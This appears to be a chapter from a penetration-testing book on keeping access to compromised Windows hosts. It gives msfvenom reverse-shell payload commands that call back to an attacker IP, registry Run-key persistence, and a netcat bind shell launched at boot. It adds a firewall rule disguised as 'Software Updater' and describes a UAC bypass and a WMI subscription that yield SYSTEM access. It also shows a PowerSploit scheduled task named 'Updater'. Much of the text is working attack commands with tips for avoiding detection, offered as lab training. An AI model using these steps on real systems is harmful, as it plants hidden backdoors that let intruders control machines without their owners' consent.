<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer365">
<h1 id="_idParaDest-315"><em class="italic"><a id="_idTextAnchor314"/>Chapter 17</em>: Maintaining Access</h1>
<p>We’ve been on a long journey together through these chapters. It’s fitting that we end up here, asking the remaining question after you’ve forced your way in and proven there’s a gap in the client’s defense – <em class="italic">how do I keep my access?</em> This is a funny question because it’s often neglected, despite its importance. When a lot of people talk about hacking computers, they think about the excitement of working your way up to breaking open the door. Hacking is problem solving, and sometimes it’s easy to forget that being able to persist our access is a problem in its own right. In the context of penetration testing in particular, persistence can be easily taken for granted because we’re often working on tight schedules. Sometimes, it seems like there’s a race to get domain admin or root, and then we just stop there to wrap up the report. It’s a shame that assessments are often scheduled this way, especially in today’s world of <strong class="bold">advanced persistent threats</strong> (<strong class="bold">APTs</strong>).</p>
<p>Remember a broad goal in your assessments: escalate from quiet to relatively noisy and note the point at which you’re caught. Getting domain admin while no one notices versus getting domain admin right as the authorities break down your door are two different results. This mentality should continue into the persistence phase.</p>
<p>In this chapter, we will cover the following:</p>
<ul>
<li>Persistence with Metasploit and PowerShell Empire</li>
<li>Quick-and-dirty persistent netcat tunnels</li>
<li>Persistent access with PowerSploit</li>
</ul>
<h1 id="_idParaDest-316"><a id="_idTextAnchor315"/>Technical requirements</h1>
<p>The following are the prerequisites for this chapter:</p>
<ul>
<li>Kali Linux</li>
<li>A Windows 10 or 7 VM</li>
</ul>
<h1 id="_idParaDest-317"><a id="_idTextAnchor316"/>Persistence with Metasploit and PowerShell Empire</h1>
<p>We’ve<a id="_idIndexMarker1161"/> covered <a id="_idIndexMarker1162"/>generating<a id="_idIndexMarker1163"/> payloads at several points throughout<a id="_idIndexMarker1164"/> this book. We played around with just plain <strong class="source-inline">msfvenom</strong> to generate payloads in a variety of formats and with custom options, and we explored stealthy patching legitimate executables with Shellter for advanced compromise. Now, we bring the discussion full circle by leveraging Metasploit’s persistence module.</p>
<h2 id="_idParaDest-318"><a id="_idTextAnchor317"/>Creating a payload for the Metasploit persister</h2>
<p>For the sake<a id="_idIndexMarker1165"/> of this demonstration, we’re going to generate a quick-and-dirty reverse Meterpreter executable. However, note that when we configure the persistence module, we can use any executable we want. </p>
<p>We’ll keep it nice and simple with the following command:</p>
<p class="source-code">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.154.133 LPORT=10000 -f exe &gt; persist.exe</p>
<p>Substitute your own IP and local port, of course:</p>
<div>
<div class="IMG---Figure" id="_idContainer346">
<img alt="Figure 17.1 – Generating the payload with msfvenom " height="336" src="image/Figure_17.01_B17616.jpg" width="1366"/>
</div>
</div>
<p class="figure-caption">Figure 17.1 – Generating the payload with msfvenom</p>
<p>A word to the wise – this isn’t your ordinary payload that you’d use for an immediate means to an end. This isn’t a payload that, once it does its job, you discard and never think about again. This malicious program will persist and give the target more time to discover it. Careful research and planning will be your friend on this one.</p>
<h2 id="_idParaDest-319"><a id="_idTextAnchor318"/>Configuring the Metasploit persistence module and firing away</h2>
<p>The old <a id="_idIndexMarker1166"/>version of <strong class="source-inline">persistence_exe</strong> had a bunch of flags for it, and you can still run it that way; however, that usage is deprecated at the time of writing, so I chose to use it as a <strong class="source-inline">post</strong> module. I like it now because it makes the whole process very simple. You define what the executable will be called when it resides on the target with <strong class="source-inline">set REXENAME</strong>, you point out where the executable is on your system with <strong class="source-inline">set REXEPATH</strong>, and you set the Meterpreter session where this attack will take place with <strong class="source-inline">set SESSION</strong>.</p>
<p>When you fire off <strong class="source-inline">run</strong>, the console will tell you exactly what it’s doing:</p>
<div>
<div class="IMG---Figure" id="_idContainer347">
<img alt="Figure 17.2 – Running the persistence module in Metasploit " height="638" src="image/Figure_17.02_B17616.jpg" width="1384"/>
</div>
</div>
<p class="figure-caption">Figure 17.2 – Running the persistence module in Metasploit</p>
<p>Let’s have a rundown of these steps:</p>
<ol>
<li>Metasploit reads your payload and writes it to the target.</li>
<li>Metasploit executes the payload and returns the process ID for immediate use.</li>
<li>Metasploit modifies the registry on the target to cause execution with every logon. (<strong class="source-inline">HKCU</strong> means <strong class="source-inline">HKEY_CURRENT_USER</strong>.)</li>
<li>The resource file that was created to accomplish these tasks is cleaned up.</li>
</ol>
<p>Now, we just sit <a id="_idIndexMarker1167"/>and wait for our remote agent to check in. Let’s get our handler ready.</p>
<h2 id="_idParaDest-320"><a id="_idTextAnchor319"/>Verifying your persistent Meterpreter backdoor</h2>
<p>Though we<a id="_idIndexMarker1168"/> can certainly verify that the registry change took place and that the payload is running in the current session, the real test is to deliberately break our connection with a reboot and wait for the phone home to our listener. Make sure you configure it with the correct port number. When you’re ready, go ahead and reboot your target:</p>
<div>
<div class="IMG---Figure" id="_idContainer348">
<img alt="Figure 17.3 – A new session from our persistent payload checking in " height="210" src="image/Figure_17.03_B17616.jpg" width="1372"/>
</div>
</div>
<p class="figure-caption">Figure 17.3 – A new session from our persistent payload checking in</p>
<p>Before long, I see the connection appear automatically upon logging in as the affected user account on the target.</p>
<p>Remember, the configuration of the persistent payload and listening attacker is crucial here. For example, if the attacker has an IP address assigned by DHCP, it’s liable to change and your payload can’t contact you anymore. Consider static IP addresses that you can keep for as long as you require persistence, and consider port numbers that aren’t likely to conflict with anything else you need while you wait for connections.</p>
<h2 id="_idParaDest-321"><a id="_idTextAnchor320"/>Not to be outdone – persistence in PowerShell Empire</h2>
<p>If you haven’t <a id="_idIndexMarker1169"/>already figured this out, PowerShell Empire is a very powerful framework. Since stealth is more important for persistence, executing payloads with PowerShell makes our lives a little easier; as you can imagine, a persistent Empire agent is gold.</p>
<p>If you need to review getting your agent up and running, go back to <a href="B17616_09_Final_VK_ePub.xhtml#_idTextAnchor165"><em class="italic">Chapter 9</em></a>, <em class="italic">PowerShell Fundamentals</em>. In our example, we’ve already set up our listener, executed a stager on the target, and established an agent connection with <strong class="source-inline">SKD217BV</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer349">
<img alt="Figure 17.4 – A new agent in PowerShell Empire " height="277" src="image/Figure_17.04_B17616.jpg" width="1373"/>
</div>
</div>
<p class="figure-caption">Figure 17.4 – A new agent in PowerShell Empire</p>
<p>Try to fire off some modules with it. You might get an error message telling you that the agent needs to be in an elevated context. Well, that’s strange – you’re already the administrator. The <a id="_idIndexMarker1170"/>likely scenario on our Windows 10 box is <a id="_idIndexMarker1171"/>that <strong class="bold">User Account Control</strong> (<strong class="bold">UAC</strong>) is enabled.</p>
<h2 id="_idParaDest-322"><a id="_idTextAnchor321"/>Elevating the security context of our Empire agent</h2>
<p>UAC is a<a id="_idIndexMarker1172"/> lovely<a id="_idIndexMarker1173"/> feature Windows users have been dealing with since Vista – it prompts you to acknowledge certain changes to the system. The logic and effectiveness is a whole debate for another place, but it’s a step in the right direction from how things used to work in Windows – when an administrator was logged on, everything that account did had administrator privileges. UAC means that everything runs at a standard user level by default, including our naughty scripts. Thankfully, Empire doesn’t sweat this problem.</p>
<p>Prepare the <strong class="source-inline">bypassuac</strong> module with <strong class="source-inline">usemodule powershell/privesc/bypassuac</strong>. If you use <strong class="source-inline">info</strong> to see your options, you’ll notice that the only important settings are <strong class="source-inline">Agent</strong> and <strong class="source-inline">Listener</strong>. Use the <strong class="source-inline">set Listener</strong> and <strong class="source-inline">set Agent</strong> commands and then the <strong class="source-inline">execute</strong> command:</p>
<div>
<div class="IMG---Figure" id="_idContainer350">
<img alt="Figure 17.5 – Our new, privileged agent reporting in " height="468" src="image/Figure_17.05_B17616.jpg" width="1399"/>
</div>
</div>
<p class="figure-caption">Figure 17.5 – Our new, privileged agent reporting in</p>
<p>Oh, look – you made a new friend! Say hello to the <strong class="source-inline">TANUBD6P</strong> agent. Note that the original agent <a id="_idIndexMarker1174"/>was not itself elevated, and it’s still <a id="_idIndexMarker1175"/>running. Instead, a new agent with the elevated rights connects back to us.</p>
<h2 id="_idParaDest-323"><a id="_idTextAnchor322"/>Creating a WMI subscription for stealthy persistence of your agent</h2>
<p>In<a id="_idIndexMarker1176"/> short, the <strong class="bold">Windows Management Instrumentation</strong> (<strong class="bold">WMI</strong>) event subscription method will<a id="_idIndexMarker1177"/> create an <em class="italic">event</em> with certain criteria that will result in persistent and fileless execution of our payload. There are different methods for this particular attack, but today we’re using the logon method. This will create a WMI event filter that will execute the payload after an uptime of 4 minutes. After entering the module mode with <strong class="source-inline">use powershell/persistence/elevated/wmi</strong>, set the agent that will receive the persistence task. Make sure you select the elevated one! It’s the agent with a star next to the username:</p>
<div>
<div class="IMG---Figure" id="_idContainer351">
<img alt="Figure 17.6 – Configuring our persistent agent " height="254" src="image/Figure_17.06_B17616.jpg" width="1332"/>
</div>
</div>
<p class="figure-caption">Figure 17.6 – Configuring our persistent agent</p>
<p>Note that we’re configuring both <strong class="source-inline">set Agent</strong> and <strong class="source-inline">set Listener</strong>. Now, let’s verify that the <a id="_idIndexMarker1178"/>persistent agent is ready to dial in.</p>
<h2 id="_idParaDest-324"><a id="_idTextAnchor323"/>Verifying agent persistence</h2>
<p>That’s it. However, the <a id="_idIndexMarker1179"/>agent isn’t letting us know how things went. How do we know it works? Reboot the target and go back to the main menu in Empire. Your listener is still faithfully waiting for new agents to check in.</p>
<p>Check out the timestamps in this lab demonstration. The first two agents that we needed for escalation are now dead and were last seen at 12:00. The only thing we need to remember about the WMI method is that the script won’t run for about 5 minutes after the machine boots up:</p>
<div>
<div class="IMG---Figure" id="_idContainer352">
<img alt="Figure 17.7 – The persistent (and elevated!) agent reporting in " height="757" src="image/Figure_17.07_B17616.jpg" width="1407"/>
</div>
</div>
<p class="figure-caption">Figure 17.7 – The persistent (and elevated!) agent reporting in</p>
<p>Whoa! Our new agent is running as <strong class="source-inline">SYSTEM</strong>. We now have total control of the computer, and it will maintain this relationship through reboots. Permanent WMI subscriptions run as <strong class="source-inline">SYSTEM</strong>, rendering this not only a valuable persistence exercise but also a<a id="_idIndexMarker1180"/> solid way to elevate privileges.</p>
<h1 id="_idParaDest-325"><a id="_idTextAnchor324"/>Hack tunnels – netcat backdoors on the fly</h1>
<p>I can hear <a id="_idIndexMarker1181"/>what you’re<a id="_idIndexMarker1182"/> thinking. You’re wondering whether netcat is really a good idea for this purpose. It isn’t an encrypted tunnel with any authentication mechanism, and <strong class="source-inline">nc.exe</strong> is notoriously flagged by AV software. Well, we’re running with netcat for now because it makes for a nice demonstration, but there is a practical purpose – I’m not sure there’s anything quite as fast as this method for creating a persistent backdoor into a shell session on a Windows target. Nevertheless, you can leverage this method with any listener you like. Let’s look closer at our handcrafted payload.</p>
<h2 id="_idParaDest-326"><a id="_idTextAnchor325"/>Uploading and configuring persistent netcat with Meterpreter</h2>
<p>We’ve seen<a id="_idIndexMarker1183"/> the easy way<a id="_idIndexMarker1184"/> to transfer files over the LAN with <strong class="source-inline">SimpleHTTPServer</strong>. This time, we’re assuming a Meterpreter foothold has been established and we’re just setting up a quicker <em class="italic">callback number</em>.</p>
<p>Use the <strong class="source-inline">upload</strong> command to get your backdoor onto the target. Next is the part that makes this happen with every boot – adding the executable to the registry. Note the double backslashes to escape the break that the single backslash normally represents:</p>
<p class="source-code">&gt; upload /usr/share/windows-binaries/nc.exe C:\\Windows\\system32</p>
<p class="source-code">&gt; reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v nc -d 'C:\Windows\system32\nc.exe -Ldp 9009 -e cmd.exe'</p>
<p>Meterpreter should report that the key was successfully set:</p>
<div>
<div class="IMG---Figure" id="_idContainer353">
<img alt="Figure 17.8 – The Meterpreter upload and registry set for the persistent netcat " height="220" src="image/Figure_17.08_B17616.jpg" width="1372"/>
</div>
</div>
<p class="figure-caption">Figure 17.8 – The Meterpreter upload and registry set for the persistent netcat</p>
<p>Note that the actual command for execution at boot time is <strong class="source-inline">nc.exe -Ldp 9009 -e cmd.exe</strong>. Don’t forget<a id="_idIndexMarker1185"/> that <a id="_idIndexMarker1186"/>port number. There’s still a step left, though.</p>
<h2 id="_idParaDest-327"><a id="_idTextAnchor326"/>Remotely tweaking Windows Firewall to allow inbound netcat connections</h2>
<p>Now, I <a id="_idIndexMarker1187"/>know what<a id="_idIndexMarker1188"/> the hacker in you is saying, <em class="italic">all we did is ensure the backdoor will load at boot time. We’re probably gonna hit a firewall on the way back in</em>. Indeed, the student becomes the master. We can use a <strong class="source-inline">netsh</strong> one-liner to take care of this. Jump into a shell with the target and send this command:</p>
<p class="source-code">&gt; netsh advfirewall firewall add rule name="Software Updater" dir=in action=allow protocol=TCP localport=9009</p>
<p>Let’s look at what this looks like:</p>
<div>
<div class="IMG---Figure" id="_idContainer354">
<img alt="Figure 17.9 – Modifying the firewall from a shell on the target " height="438" src="image/Figure_17.09_B17616.jpg" width="1372"/>
</div>
</div>
<p class="figure-caption">Figure 17.9 – Modifying the firewall from a shell on the target</p>
<p>Note that I gave the rule a name. This involves a little social engineering on your part; you hope that an administrator glancing over the rules will tune out words such as <em class="italic">software</em> and <em class="italic">updater</em>. Of course, you could make the name <em class="italic">You got haxxed bro</em>. It’s up to you.</p>
<p>The <strong class="source-inline">netsh</strong> command lets you know that all is well with your rule addition with a simple <strong class="source-inline">Ok</strong>. Now, just<a id="_idIndexMarker1189"/> as<a id="_idIndexMarker1190"/> before, let’s confirm that the netcat backdoor will persist. </p>
<h2 id="_idParaDest-328"><a id="_idTextAnchor327"/>Verifying persistence is established</h2>
<p>Well, this is the<a id="_idIndexMarker1191"/> easiest thing to verify. Try to contact your backdoor after rebooting the target:</p>
<div>
<div class="IMG---Figure" id="_idContainer355">
<img alt="Figure 17.10 – Grabbing a shell from our backdoor after reboot " height="284" src="image/Figure_17.10_B17616.jpg" width="936"/>
</div>
</div>
<p class="figure-caption">Figure 17.10 – Grabbing a shell from our backdoor after reboot</p>
<p>Once again, try this out with different listeners. Perhaps you could get away with SSH? Maybe you could get more granular with the firewall rule to only allow your IP address. Hopefully, the potential is clear to you now.</p>
<p>No discussion about persistence on Windows targets is complete without a step into the world of PowerSploit. Let’s check it out.</p>
<h1 id="_idParaDest-329"><a id="_idTextAnchor328"/>Maintaining access with PowerSploit</h1>
<p>The PowerSploit <a id="_idIndexMarker1192"/>framework is a real treat for the post-exploitation phase. The framework consists of a goodie bag full of PowerShell scripts that do various bits of magic. A full exploration of PowerSploit is an exercise I leave to you, dear reader. For now, we’re checking out the persistence module.</p>
<p>Let’s understand the module concept first. Modules are essentially collections of PowerShell scripts that together form a cohesive theme or type of task. You can group tools together in a folder, dump that into the module path, and then import the group as needed. A well-written module integrates seamlessly with all of what makes PowerShell special. In particular, <strong class="source-inline">Get-Help</strong> works as expected with the scripts. Yes, you can <a id="_idIndexMarker1193"/>run <strong class="source-inline">Get-Help</strong> on these malicious scripts to understand exactly how to use them. Let’s try it out.</p>
<h2 id="_idParaDest-330"><a id="_idTextAnchor329"/>Installing the persistence module in PowerShell</h2>
<p>In older <a id="_idIndexMarker1194"/>versions <a id="_idIndexMarker1195"/>of Kali, we had to <a id="_idIndexMarker1196"/>manually pull the latest and greatest PowerSploit. Today, it’s built in and updatable with <strong class="source-inline">apt</strong>, so you can immediately use <strong class="source-inline">powersploit</strong> and start <strong class="source-inline">SimpleHTTPServer</strong> so that we can deliver the goodies to our Windows 10 box, where we’ll be prepping the persistence script:</p>
<div>
<div class="IMG---Figure" id="_idContainer356">
<img alt="Figure 17.11 – Setting up an HTTP server inside PowerSploit’s folder " height="634" src="image/Figure_17.11_B17616.jpg" width="968"/>
</div>
</div>
<p class="figure-caption">Figure 17.11 – Setting up an HTTP server inside PowerSploit’s folder</p>
<p>With a browser running on the Windows 10 attacking box, download the entire <strong class="source-inline">Persistence</strong> folder. If you’re downloading the files individually, just make sure they end up in a local folder called <strong class="source-inline">Persistence</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer357">
<img alt="Figure 17.12 – Grabbing the PowerSploit modules from the Kali attacker " height="481" src="image/Figure_17.12_B17616.jpg" width="1098"/>
</div>
</div>
<p class="figure-caption">Figure 17.12 – Grabbing the PowerSploit modules from the Kali attacker</p>
<p>Now, we <a id="_idIndexMarker1197"/>need <a id="_idIndexMarker1198"/>to<a id="_idIndexMarker1199"/> install the persistence module in PowerShell. All we have to do is move the newly acquired <strong class="source-inline">Persistence</strong> folder over to the PowerShell module path on our system. Fire up PowerShell and display the <strong class="source-inline">PSModulePath</strong> environment variable with <strong class="source-inline">$Env:PSModulePath</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer358">
<img alt="Figure 17.13 – Confirming the module path " height="633" src="image/Figure_17.13_B17616.jpg" width="1403"/>
</div>
</div>
<p class="figure-caption">Figure 17.13 – Confirming the module path</p>
<p>Just do an ordinary cut and paste of the <strong class="source-inline">Persistence</strong> folder to your module path. You should see the other installed modules in this location as well.</p>
<p>Slow<a id="_idIndexMarker1200"/> down. Don’t<a id="_idIndexMarker1201"/> pop <a id="_idIndexMarker1202"/>the cork on that champagne just yet. If you’re using a freshly installed Windows VM as your attacker, you probably have a restricted execution policy set for PowerShell. We’ll want to open it up with <strong class="source-inline">Set-ExecutionPolicy -ExecutionPolicy Unrestricted</strong>. Then, we can import our new fancy module with <strong class="source-inline">Import-Module Persistence</strong>. You’ll be prompted for permission to become an evil hacker. The default is <strong class="source-inline">Do not run</strong>, so make sure to pass <strong class="source-inline">R</strong> to the command prompt. When you’re all done, you can fire up the <strong class="source-inline">Get-Help</strong> cmdlet, as you would for any old module:</p>
<div>
<div class="IMG---Figure" id="_idContainer359">
<img alt="Figure 17.14 – The persistence module help screen " height="256" src="image/Figure_17.14_B17616.jpg" width="1418"/>
</div>
</div>
<p class="figure-caption">Figure 17.14 – The persistence module help screen</p>
<p>See how there are three scripts here? They work together to build a single payload. Let’s get started building our own.</p>
<h2 id="_idParaDest-331"><a id="_idTextAnchor330"/>Configuring and executing Meterpreter persistence</h2>
<p>Now, we’re <a id="_idIndexMarker1203"/>ready to build<a id="_idIndexMarker1204"/> our gift to share with the world. First, we need to understand how these three scripts work. They’re not individual tools that you pick and choose from as needed; they are all <em class="italic">one</em> tool. To create any persistent script, you’ll need to run all three in a particular order:</p>
<ul>
<li><strong class="source-inline">New-UserPersistenceOption</strong> and <strong class="source-inline">New-ElevatedPersistenceOption</strong> must be executed first. The order doesn’t matter as long as it’s before the final script, <strong class="source-inline">Add-Persistence</strong>. These two scripts are used to define the persistence specifics that will make it into the final product. Why two? Because you’re telling your payload how to handle being either a standard user or a privileged user. Perhaps you want to configure these settings differently, depending on whether an administrator runs it or not. For now, we’ll just make the settings the same for both.</li>
<li><strong class="source-inline">Add-Persistence</strong> needs the configuration defined in the first two scripts. These are passed to <strong class="source-inline">Add-Persistence</strong> as environment variables of your choosing.</li>
</ul>
<p>Clear as mud? Let’s dive in. First, we need a payload. What’s nice about this is that any old PowerShell script will do fine. Maybe you have a favorite from our earlier review of PowerShell. Perhaps you typed up your own. For now, we’ll generate an example with the ever-useful <strong class="source-inline">msfvenom</strong>. One of the format options is PowerShell!</p>
<p class="source-code"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.154.131 LPORT=8008 -f psh &gt; attack.ps1</p>
<p>I ended up with a 2.5 KB payload – not too shabby:</p>
<div>
<div class="IMG---Figure" id="_idContainer360">
<img alt="Figure 17.15 – Preparing our payload and delivering it " height="469" src="image/Figure_17.15_B17616.jpg" width="1388"/>
</div>
</div>
<p class="figure-caption">Figure 17.15 – Preparing our payload and delivering it</p>
<p>Get that script to your <em class="italic">script builder</em> system (I used <strong class="source-inline">SimpleHTTPServer</strong> again; I just love that thing). Don’t take it to your target; we don’t have our persistent script just yet. Remember, if you only have access to one Windows box, your script builder and target are the same system.</p>
<p>Now, we <a id="_idIndexMarker1205"/>run <a id="_idIndexMarker1206"/>the three scripts – the two option scripts with output stored as environment variables, and then the persistence script with the options pulled in and the payload script defined:</p>
<p class="source-code">&gt; $userop = New-UserPersistenceOption -ScheduledTask -Hourly</p>
<p class="source-code">&gt; $suop = New-ElevatedPersistenceOption -ScheduledTask -Hourly</p>
<p class="source-code">&gt; Add-Persistence -FilePath .\attack.ps1 -ElevatedPersistenceOption $suop -UserPersistenceOption $userop</p>
<p>Check out the file sizes of the scripts that the persistence module spits out:</p>
<div>
<div class="IMG---Figure" id="_idContainer361">
<img alt="Figure 17.16 – The payload is packed and ready " height="690" src="image/Figure_17.16_B17616.jpg" width="1444"/>
</div>
</div>
<p class="figure-caption">Figure 17.16 – The payload is packed and ready</p>
<p>You can run <strong class="source-inline">ls</strong> or <strong class="source-inline">dir</strong> when you’re done to verify that it worked. You should see two new scripts – <strong class="source-inline">Persistence.ps1</strong> and <strong class="source-inline">RemovePersistence.ps1</strong>. The latter is for cleaning up<a id="_idIndexMarker1207"/> your<a id="_idIndexMarker1208"/> mess, should you need it. This will be important in a pen test, so don’t lose that file! Get <strong class="source-inline">Persistence.ps1</strong> over to your target.</p>
<p>As always, the next step is waiting for our loyal package to start reporting in. Let’s look at getting it executed and verified.</p>
<h2 id="_idParaDest-332"><a id="_idTextAnchor331"/>Lying in wait – verifying persistence</h2>
<p>Execute <strong class="source-inline">Persistence.ps1</strong> on your<a id="_idIndexMarker1209"/> target (how <a id="_idIndexMarker1210"/>you accomplish this is limited only by your imagination, tiny grasshopper). That’s it. No explosions. No confetti. So, let’s see what actually happened behind the scenes. Pull up <strong class="bold">Task Scheduler</strong> on the target system:</p>
<div>
<div class="IMG---Figure" id="_idContainer362">
<img alt="Figure 17.17 – Task Scheduler on the target " height="689" src="image/Figure_17.17_B17616.jpg" width="937"/>
</div>
</div>
<p class="figure-caption">Figure 17.17 – Task Scheduler on the target</p>
<p>Among the tasks <a id="_idIndexMarker1211"/>scheduled to run on this system, note<a id="_idIndexMarker1212"/> the little guy called <strong class="bold">Updater</strong>. It is designed to trigger a PowerShell script every hour. It says here that the next runtime is 2:30. Well, it’s not quite that time yet, so I’ll reboot the target, grab some coffee, and relax, with Meterpreter listening for the songs of its people. In the meantime, let’s look at what the persistence script does.</p>
<p>Before we open up <strong class="source-inline">Persistence.ps1</strong> in the PowerShell ISE, let me show you the script<a id="_idIndexMarker1213"/> in <strong class="bold">Notepad</strong> with <strong class="bold">Word Wrap</strong> enabled. I’ve<a id="_idIndexMarker1214"/> highlighted the actual payload that’s getting persisted:</p>
<div>
<div class="IMG---Figure" id="_idContainer363">
<img alt="Figure 17.18 – The payload packaged for task scheduling " height="421" src="image/Figure_17.18_B17616.jpg" width="741"/>
</div>
</div>
<p class="figure-caption">Figure 17.18 – The payload packaged for task scheduling</p>
<p>It’s a <a id="_idIndexMarker1215"/>compressed <a id="_idIndexMarker1216"/>Base64 stream. Now, let’s take a look at the rest in the ISE:</p>
<div>
<div class="IMG---Figure" id="_idContainer364">
<img alt="Figure 17.19 – The payload open for learning and tweaking " height="439" src="image/Figure_17.19_B17616.jpg" width="730"/>
</div>
</div>
<p class="figure-caption">Figure 17.19 – The payload open for learning and tweaking</p>
<p>It won’t all fit on<a id="_idIndexMarker1217"/> the<a id="_idIndexMarker1218"/> page here, so I encourage you to study it and get an idea of what’s happening here. For example, check out the <strong class="source-inline">$Payload</strong> declaration – <strong class="source-inline">schtasks /Create /SC HOURLY /TN Updater</strong> (and so on). This will give you an idea of how the script ticks, but it’s also an opportunity for you to make your own tweaks as you deem necessary. </p>
<h1 id="_idParaDest-333"><a id="_idTextAnchor332"/>Summary</h1>
<p>In this chapter, we discovered ways of maintaining our access to the target systems once we’ve established ourselves on the network. This gives us more time to gather information and potentially deepen the compromise. We learned that modern threats are persistent, and so having these techniques in our repertoire as pen testers increases the value of the assessment to the client. We generated <strong class="source-inline">msfvenom</strong> payloads while explaining how to use more sophisticated payloads with these persistence tools. After exploring the persistence capabilities of both Metasploit and PowerShell Empire, we looked at quick and easy persistent backdoor building with netcat and Meterpreter Finally, we demonstrated the persistence module of the PowerSploit framework by taking a script and embedding it in code that persists the payload on the target.</p>
<p>If you’re still awake, congratulations – you’ve made it to the end of our journey! But as I’ve said before, we’ve only dipped our toes in these refreshing waters. If you’d like to dive in, consider signing up for <strong class="bold">Hack The Box</strong>, the premier hacker training playground on the internet. You can work your way up from beginner to advanced, participate in the Academy to get some online training courses, and head back into the fray to practice your new skills. The entire process is gamified, so it’s both easy to track your progress and fun.</p>
<p>That’s great for practice, fun, and getting trained up – but if you’re looking for enterprise-grade training with a truly challenging certification process to bolster your résumé, who better than the actual creators of Kali? Head over to Offensive Security for both introductory and advanced training courses, plus Proving Grounds to try your hand with your new skills.</p>
<p>Those are two great resources, but the final word is that the true spirit and driving force of hacking isn’t something you buy – it’s an attitude, a lifestyle, and a way of approaching problems, on a computer and elsewhere in life. Whatever drove you to pick up this book is what you need to keep going down this path, so foster it, and prepare yourself for a truly rewarding career and hobby.</p>
<h1 id="_idParaDest-334"><a id="_idTextAnchor333"/>Questions</h1>
<p>Answer the following questions to test your knowledge of this chapter:</p>
<ol>
<li value="1">The <strong class="source-inline">persistence_exe</strong> module works by adding a value in the _________. </li>
<li>What does the <strong class="source-inline">msfvenom</strong> flag <strong class="source-inline">-f psh</strong> mean?</li>
<li>The PowerSploit Persistence module scripts must be run in this order: 1) <strong class="source-inline">New-UserPersistenceOption</strong>, 2) <strong class="source-inline">New-ElevatedPersistenceOption</strong>, and 3) <strong class="source-inline">Add-Persistence</strong> – true or false?</li>
<li>A hacker has uploaded and persisted netcat on a compromised Windows Server 2008 box. They then run this command to allow their connections into the backdoor – <strong class="source-inline">netsh advfirewall firewall add rule name="WindowsUpdate" dir=out action=allow protocol=TCP localport=9009</strong>. They can’t connect to their backdoor. Why?</li>
<li>Permanent WMI subscriptions run as _____. </li>
<li>In Metasploit, a <strong class="source-inline">.rc</strong> file is a _________. </li>
<li><strong class="source-inline">HKEY_LOCAL_MACHINE</strong> is shorted to ________ when using <strong class="source-inline">reg setval</strong>.</li>
</ol>
<h1 id="_idParaDest-335"><a id="_idTextAnchor334"/>Further reading</h1>
<p>For more information regarding the topics that were covered in this chapter, take a look at the following resources:</p>
<ul>
<li>A TechNet article on launching scripts with a WMI subscription: <a href="https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript/">https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript/</a></li>
<li>PowerSploit GitHub with details about scripts: <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> </li>
</ul>
</div>
</div></body></html>